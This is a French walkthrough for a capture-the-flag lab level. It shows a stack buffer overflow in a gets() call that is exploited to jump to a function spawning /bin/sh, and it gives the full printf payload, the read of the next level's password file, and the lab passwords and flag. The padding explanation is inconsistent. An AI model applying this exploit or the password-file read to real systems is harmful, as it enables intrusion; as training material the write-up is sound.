# Level1 - Walkthrough

## Objectif
Exploiter un buffer overflow pour obtenir le flag de level2.

---

## Étape 1 : Connexion
```bash
ssh level1@192.168.1.45 -p 4242
# Mot de passe : 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```

---

## Étape 2 : Reconnaissance
```bash
ls -la
```

Observer le binaire :
```
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
```

Tester le programme :
```bash
./level1
# Entrer une chaîne courte, observer le comportement

./level1
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890  # -> 100 caractères
# Segmentation fault → Buffer overflow détecté
```

---

## Étape 3 : Copier le binaire et décompiler
```bash
# Sur votre machine locale
scp -P 4242 level1@192.168.1.45:~/level1 ~/downloads/
```

Dans Ghidra :
1. Importer `level1`
2. Analyser le binaire
3. Examiner la fonction `main` :
```c
   void main(void)
   {
     char local_50[76];
     gets(local_50);
     return;
   }
```
4. Lister toutes les fonctions disponibles
5. Décompiler la fonction `run` :
```c
   void run(void)
   {
     fwrite("Good... Wait what?\n", 1, 0x13, stdout);
     system("/bin/sh");
     return;
   }
```

---

## Étape 4 : Trouver l'adresse de run
```bash
gdb level1
(gdb) info functions
# Résultat : 0x08048444  run

(gdb) print run
# Confirmer l'adresse : 0x08048444
```

---

## Étape 5 : Trouver l'offset

Dans GDB, tester l'offset :
```gdb
(gdb) run
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
^D
# Si le crash montre EIP = 0x42424242 (BBBB), l'offset est de 80 octets
```

---

## Étape 6 : Construire le payload

Structure du payload :
- 76 octets de padding (buffer)
- 4 octets de padding (EBP)
- 4 octets : adresse de `run` en little-endian

Adresse de `run` : `0x08048444`  
En little-endian : `\x44\x84\x04\x08`

Payload final :
```bash
(printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x44\x84\x04\x08'; cat) | ./level1
```

Note : 76 'A' dans le printf ci-dessus (80 octets au total avec les 4 derniers 'A').

---

## Étape 7 : Exploitation
```bash
level1@RainFall:~$ (printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x44\x84\x04\x08'; cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

---

## Étape 8 : Passer au niveau suivant
```bash
exit

su level2
# Mot de passe : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

---

## Flag
```
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```